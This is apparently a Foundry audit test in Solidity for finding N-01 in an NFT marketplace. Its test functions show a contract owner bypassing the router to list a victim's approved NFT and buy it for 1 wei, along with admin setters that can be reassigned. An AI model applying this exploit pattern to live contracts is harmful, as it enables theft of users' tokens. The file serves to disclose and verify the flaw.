// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "../src/Marketplace.sol";
import "../src/MarketplaceCore.sol";
import "../src/MarketplaceBids.sol";
import "./TestSetup.sol";

/// @notice N-01: Owner/multisig can steal any NFT that has an approval to Core
contract AuditN01Test is Test {
    MarketplaceCore public core;
    MarketplaceBids public bids;
    Marketplace public router;
    MockNFT public nft;
    
    address public owner = address(0x111);
    address public victim = address(0x222);
    address public attacker = address(0x333);
    
    function setUp() public {
        vm.startPrank(owner);
        
        // Deploy the system - owner KEEPS ownership (showing the vulnerability)
        core = new MarketplaceCore(250, address(owner)); // 2.5% fee
        bids = new MarketplaceBids(address(core));
        
        // Set bids contract in core
        core.setBidsContract(address(bids));
        
        // Deploy router
        router = new Marketplace(address(core), address(bids));
        
        // Owner DOES NOT transfer ownership to router (showing the issue)
        // In a real attack, owner would keep ownership
        
        // N-01: configure the system using the router's one-shot setup
        router.configureBidsMarketplace();
        
        vm.stopPrank();
        
        // Deploy test NFT
        nft = new MockNFT();
    }
    
    function testN01_OwnerCanStealNFTViaDirectCoreCall() public {
        // First register the collection
        vm.startPrank(owner);
        core.registerCollectionFromRouter(address(nft), 500, victim, victim);
        vm.stopPrank();
        
        // Setup: victim approves Core and lists NFT
        vm.startPrank(victim);
        nft.mint(victim, 1);
        nft.setApprovalForAll(address(core), true);
        
        // Victim creates a listing through router (normal flow)
        router.createListing(address(nft), 1, 1 wei, 0);
        vm.stopPrank();
        
        // Verify NFT is owned by victim
        assertEq(nft.ownerOf(1), victim);
        
        // Give owner ETH
        vm.deal(owner, 1 ether);
        
        // Attacker (owner) can call Core directly and buy NFT for 1 wei
        vm.startPrank(owner);
        core.buy{value: 1 wei}(address(nft), 1, attacker);
        vm.stopPrank();
        
        // NFT was stolen!
        assertEq(nft.ownerOf(1), attacker);
    }
    
    function testN01_OwnerCanCreateListingForVictim() public {
        // First register the collection
        vm.startPrank(owner);
        core.registerCollectionFromRouter(address(nft), 500, victim, victim);
        vm.stopPrank();
        
        // Setup: victim approves Core
        vm.startPrank(victim);
        nft.mint(victim, 1);
        nft.setApprovalForAll(address(core), true);
        vm.stopPrank();
        
        // Give owner ETH
        vm.deal(owner, 1 ether);
        
        // Owner creates listing for victim's NFT
        vm.startPrank(owner);
        core.createListing(address(nft), 1, 1 wei, 0, victim);
        
        // Owner buys it cheap
        core.buy{value: 1 wei}(address(nft), 1, attacker);
        vm.stopPrank();
        
        // NFT stolen
        assertEq(nft.ownerOf(1), attacker);
    }
    
    function testN01_SetBidsContractIsReassignable() public {
        // Current issue: setBidsContract can be called multiple times
        address newBids = address(0x999);
        
        vm.startPrank(owner);
        core.setBidsContract(newBids);
        
        // Can be called again!
        core.setBidsContract(address(bids));
        vm.stopPrank();
    }
    
    function testN01_SetMarketplaceAddressIsReassignable() public {
        address newMarketplace = address(0x888);
        
        vm.startPrank(owner);
        bids.setMarketplaceAddress(newMarketplace);
        
        // Can be called again!
        bids.setMarketplaceAddress(address(router));
        vm.stopPrank();
    }
}